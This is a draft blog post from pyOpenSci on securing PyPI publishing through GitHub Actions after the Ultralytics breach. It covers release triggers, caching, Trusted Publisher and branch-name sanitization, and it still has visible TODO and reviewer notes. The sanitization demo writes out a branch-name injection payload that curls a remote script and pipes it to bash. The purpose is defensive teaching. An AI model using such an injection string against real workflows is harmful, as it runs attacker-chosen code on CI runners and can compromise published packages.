---
layout: single
title: "How to Secure Your Python Packages on PyPI: Stop the Mining Madness"
excerpt: "Learn how to secure your Python package PyPI publishing workflows and protect your package from attacks. This post covers actionable steps, using PyPI Trusted Publisher, and sanitizing workflows, to ensure your projects stay safe."
author: "Leah Wasser"
permalink: /blog/python-packaging-security-publish-pypi.html
header:
  overlay_image: images/headers/pyopensci-inessa.png
  overlay_filter: rgba(20, 13, 36, 0.3)
categories:
  - blog-post
  - community
classes: wide
toc: true
comments: true
last_modified: 2024-12-13
---

## Is your PyPI publication workflow secure?

The recent Python package breach [involving Ultralytics](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/) has highlighted the need for secure PyPI publishing workflows. Hackers exploited a GitHub workflow to inject malicious code into their package. This package was then published to PyPI. Users who downloaded the package unknowingly allowed their machines to be hijacked for Bitcoin mining.

> Hackers tricked a Python package into running bad code, using other people’s computers to mine Bitcoin without permission. Yikes!

While unsettling, there’s a silver lining: the PyPI security team had already addressed most of the issues that caused this breach.


{% include pyos-blockquote.html quote="Because the Ultralytics project was using Trusted Publishing and the PyPA’s publishing GitHub Action: PyPI staff, volunteers, and security researchers were able to dig into how maliciously injected software was able to make its way into the package." author="Seth Larson, PSF Security Expert" class="highlight magenta" %}

This incident underscores the importance of understanding Python packaging security best practices.

In this blog post, we'll cover the lessons learned that you can apply - TODAY - to your own Python packaging workflows!

<div class="notice" markdown="1">
## TL&DR Takeaways

The Ultralytics breach is a wake-up call for all maintainers: secure your workflows now to protect your users and the Python ecosystem. Start with these key actions:

### 🔐 Secure your GitHub action workflows 🔐
- 🚫 Avoid risky trigger events in GitHub actions like `pull_request_target`
- Consider using publish workflows on GitHub that are triggered by a [GitHub release](https://docs.github.com/en/repositories/releasing-projects-on-github/managing-releases-in-a-repository) rather than a pull request merge.
- ♻️ Don’t cache dependencies in your publish workflows to prevent tampering.
- If you reference branches in a pull request, clean or [sanitize branch names](https://docs.github.com/en/get-started/using-git/dealing-with-special-characters-in-branch-and-tag-names) in your workflow.
- Consider using [zizmor](https://woodruffw.github.io/zizmor/) to check your GitHub workflows for security vulnerabilities!

### Lock down both GitHub repo access and the workflow itself
- 🔒 Restrict direct repository access to merge PRs and write to the repository to your core maintainers.
- ✅ Use an environment in your GitHub workflow that creates a secure connection with PyPI.
- Delete old GitHub tokens that you are no longer using. And Refresh existing tokens that you need periodically.

### Strengthen PyPI security
- 🔑 Set up Trusted Publisher for tokenless authentication with PyPI.
- Make sure you store recovery codes securely for PyPI 2-factor authentication (2FA).

These steps will significantly reduce risks to your packages, contributors, and the broader Python ecosystem. Don’t wait—start securing your workflows today.
</div>


## A call to action if you are publishing to PyPI using GitHub actions

What's important for us is that this event highlights the need for our ecosystem to follow and understand secure PyPI publishing practices and carefully monitor workflows. And the good news here is that if you are already publishing to PyPI using a GitHub action, there are things you can do RIGHT NOW to ensure your build is more secure.

For this post, we will use [this workflow that pyOpenSci has setup](https://github.com/pyOpenSci/pyosMeta/blob/main/.github/workflows/publish-pypi.yml) that was reviewed and developed by both a PyPI maintainer and also several core pyOpenSci community members that have significant knowledge about best practices in publishing to PyPI.

Below are actionable steps you can take to enhance security when publishing Python packages to PyPI using GitHub actions.


## 1. Avoid `pull_request_target` and consider release-based workflows

The [`pull_request_target`](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) event in GitHub Actions that Ultralytics used, allows workflows to run with elevated permissions on the base branch, even when triggered by changes from a fork. Thus, when used as a trigger to push a release to PyPI, your workflow becomes vulnerable.

Instead, consider adopting a **release-based workflow**:

- Trigger publication workflows only on versioned releases.
- Ensure workflows related to publishing are explicitly scoped to `release` events or tagged commits.

Notice in our workflow below that we use a `release` trigger to avoid these risks. While we also have a `push` trigger, it never triggers a publication to PyPI.


```yaml
name: Publish to PyPI
on:
  # By using release - only people with admin access to make releases to our repo can trigger the push to PyPI
  release:
    types: [published]
  push:
    branches:
      - main
```

In the example above, the push trigger is only used to test that the package distribution files can be built. To ensure that a package is only ever published on a release, we include a conditional in the publish-to-PyPI step:

```yaml
  - name: Publish package to PyPI
    # Only publish to real PyPI on release
    if: github.event_name == 'release'
```

This approach ensures that the publishing step is tightly controlled, reducing the risk of malicious activity in your workflow.

## 2. Don’t cache package dependencies in your publish step

Caching dependencies involves storing them to be reused in future workflow runs. This approach saves time, as GitHub doesn’t need to redownload all dependencies each time the workflow runs.

TODO: create graphic about reusing dependencies

However, caching dependencies can allow attackers to manipulate cached artifacts, such as dependencies. If this happens, the workflow may pull in compromised versions from the cache during the next run.

**Takeaway:**  Don’t cache dependencies in your Python package publishing workflow. Always download fresh dependencies to ensure you’re using the latest secure versions of any packages your project depends on.

Below is an example of a build that caches dependencies.

```yaml
name: Build and Test

on:
  push:
    branches:
      - main
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      # Step 1: Check out the repository
      - name: Check out repository
        uses: actions/checkout@v3

      # Step 2: Set up Python
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.12'

      # Step 3: Cache dependencies
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      # Step 4: Install dependencies
      - name: Install dependencies
        run: pip install -r requirements.txt

      # Step 5: Publish to PyPI
      ...
```

## 4. Use Trusted Publisher for PyPI

If you only [publish locally to PyPI using the command line](https://www.pyopensci.org/python-package-guide/tutorials/publish-pypi.html), you need to use a PyPI token. However, if you’re using GitHub Actions to automate your publishing process, setting up **Trusted Publisher** is a more secure option.

A Trusted Publisher setup creates a secure "pipeline" between PyPI and your GitHub repository because:
- PyPI is allowed to authenticate your [package distribution files (sDist and Wheel archives)](https://www.pyopensci.org/python-package-guide/package-structure-code/python-package-distribution-files-sdist-wheel.html#how-to-create-the-distribution-format-that-pypi-and-pip-expects) uploads directly, so no additional configuration is required.
- It restricts publishing to specific workflows and environments defined in your repository.

TODO: fix
This setup eliminates the need to store sensitive tokens as GitHub secrets. And if used with GitHub environments that only can be run by a "trusted human" manually authorizing the action to publish, ... it will significantly reduce the risk of token theft or unauthorized publication.

NOTE: vI don't fully agree with that note on unauthorized publication. Unauthorized publication can be prevented by controlling the trigger of the release process. Or setting up required reviewers in the environment used in the publishing job (usually called pypi) — this would prevent said job from even starting until a trusted human being clicks a button on GH. Recording the environment name on the PyPI side, though, allows restricting the “identity” of the workflow+repo+env that is to be considered “trusted”. But this only works on the authentication level between PyPI and GH. But not between GH and human, which is what you also want to secure.

### How to get started

[PyPI provides a great guide to getting started with Trusted Publisher](https://docs.pypi.org/trusted-publishers/adding-a-publisher/).

The basic steps associated with Trusted Publisher are:
1. Go to your PyPI account and add a trusted publisher workflow to your account.
2. Fill out a form that looks like the one below. Notice that it asks for your workflow name, environment (STRONGLY recommended), and package name.
3. Update your GitHub action workflow to reference the Trusted Publisher configuration.

<figure>
  <picture>
    <source srcset="/images/python-packaging/trusted-publisher-form.webp" type="image/webp">
    <img src="trusted-publisher-form.webp" alt="PyPI Trusted Publisher form example showing settings for linking a GitHub repository with PyPI for secure publishing." loading="lazy">
  </picture>
  <figcaption>
    Example of the PyPI Trusted Publisher form, used to securely link a GitHub repository with PyPI for publishing Python packages. Trusted Publisher reduces the risk of token theft and improves overall security.
  </figcaption>
</figure>

You can see how to set up GitHub Actions securely in our own [PyPI publishing GitHub workflow](https://github.com/pyOpenSci/pyosMeta/blob/main/.github/workflows/publish-pypi.yml), which follows the Trusted Publisher approach.

**Note:** Read more here about [support for publishing to GitLab](https://docs.pypi.org/trusted-publishers/adding-a-publisher/#gitlab-cicd) using trusted publishing.
{: .notice }

## 5. Create a dedicated environment for publishing actions

Use isolated environments in combination with Trusted Publisher in your GitHub workflow to publish to PyPI.
Isolated environments ensure your publishing process remains secure even if other parts of your CI pipeline are compromised.

If you look at the pyoMeta workflow, notice that we have an [environment called `pypi`](https://github.com/pyOpenSci/pyosMeta/blob/2a09fba/.github/workflows/publish-pypi.yml#L57) that is used for trusted publishing. By setting this up, we have created a direct pipeline between this action and PyPI via the PyPI environment and the trusted publisher setup, which refers to the workflow file's name.

```yaml
  publish:
    name: >-
      Publish Python 🐍 distribution 📦 to PyPI
    if: github.repository_owner == 'pyopensci'
    needs:
      - build
    runs-on: ubuntu-latest
    environment:
      name: pypi
      url: https://pypi.org/p/pyosmeta
```
<TODO: add an image of setting up permissions in the REPO for who can authorize this environment to run>

## 6. Sanitize a branch name in your workflow, before calling it!

One of the critical issues in the Ultralytics breach was that attackers crafted a [**malicious branch name containing a shell script**](https://github.com/ultralytics/ultralytics/pull/18020) 🤯. This script executed within the GitHub Action workflow because the branch name was directly referenced using `github.ref`.

When `github.ref` is used without sanitization, malicious content embedded in branch names can be executed. This is known as a **template injection**:

{% include pyos-blockquote.html quote="...is a classic GitHub Actions template injection: the expansion of `github.head_ref || github.ref` is injected directly into the shell’s context, with no quoting or interpolation.." author="https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection" class="highlight magenta" %}

Because the branch name wasn’t sanitized, it was treated as a shell command and executed with full permissions. Yikes!


### Problem: a GitHub action that calls 'ref' to the workflow that could be manipulated

Below is an example of a potentially vulnerable packaging workflow. If the branch name contains malicious content, this workflow could execute harmful commands:

```yaml
jobs:
  example-job:
    runs-on: ubuntu-latest
    steps:
      - name: Run a script
        run: |
          echo "Running script for branch: $GITHUB_REF"
```

### Solution: Sanitize the Branch Name

To fix this, sanitize or clean the branch name before using it in your workflows. A small Bash cleanup step removes unexpected or unsafe characters.

```
jobs:
  example-job:
    runs-on: ubuntu-latest
    steps:
      - name: Sanitize branch name
        run: |
          SAFE_BRANCH=$(echo $GITHUB_REF | sed 's/[^a-zA-Z0-9_\-\/]//g')
          echo "Sanitized branch name: $SAFE_BRANCH"
          echo "Running script for branch: $SAFE_BRANCH"
```

<div class="notice" markdown="1">
How cleaning the branch name works:

1.	echo $GITHUB_REF: Outputs the branch name.
2.	sed 's/[^a-zA-Z0-9_\-\/]//g': Removes any characters that are not letters, numbers, dashes, underscores, or slashes, ensuring the branch name is safe.

Try It:

Test how sanitization works by running this command in your shell:
the branch name:  $({curl,-sSfL,raw.githubusercontent.com/test/test/123456d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/dummyfile.sh} | bash)


```bash
# Input string
input='$({curl,-sSfL,raw.githubusercontent.com/test/test/123456d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/dummyfile.sh} | bash)'

# Sanitization step
sanitized=$(echo "$input" | sed 's/[\$\{\}\|\(\)]//g')

# Output the sanitized string
echo "Original: $input"
echo "Sanitized: $sanitized"
```

This strips out any characters that can be used to call shell commands.

</div>

The good news here is that if you use a release-based workflow as discussed earlier, then you don't have to worry about branch names. And yes you can always make a release from a different branch!

Restricting publish workflows to tagged releases significantly reduces the risk of such attacks.


## GitHub & PyPI security tips

In addition to securing your workflows, lock down your accounts and repositories:

- **Enable 2FA (2-factor authentication)** for both PyPI and GitHub to prevent unauthorized access. Store recovery codes securely (e.g., in a password manager).
- **Revoke old tokens**: If you've previously created PyPI API tokens or GitHub secrets, delete any unused or outdated ones.
- **Restrict repository access**: Limit write access to a trusted subset of maintainers. Most contributors don’t need direct write access, which reduces security risks.

## Learn More

pyOpenSci follows best practices for PyPI publishing using our custom GitHub Actions workflow. Check out our tutorial on Python packaging here:
👉 [pyOpenSci Packaging Tutorial](https://www.pyopensci.org/python-package-guide/package-structure-code/python-package-structure.html)
👉 Join our discourse here

<div class="notice" markdown="1">
## Get involved with pyOpenSci

* Keep an eye on our [events page](/events.html) for upcoming training events.

Follow us on social platforms:

* [<i class="fa-brands fa-discourse"></i> Discourse](https://pyopensci.discourse.group/)
* [<i class="fa-brands fa-mastodon"></i> Mastodon](https://fosstodon.org/@pyopensci)
* [<i class="fa-solid fa-cloud"></i> Bluesky](https://bsky.app/profile/pyopensci.bsky.social)
* [<i class="fa-brands fa-linkedin"></i> LinkedIn](https://www.linkedin.com/company/pyopensci)
* [<i class="fa-brands fa-github"></i> GitHub](https://github.com/pyOpenSci)

If you are on LinkedIn, you should [subscribe to our newsletter, too](https://www.linkedin.com/newsletters/7179551305344933888/?displayConfirmation=true).
</div>
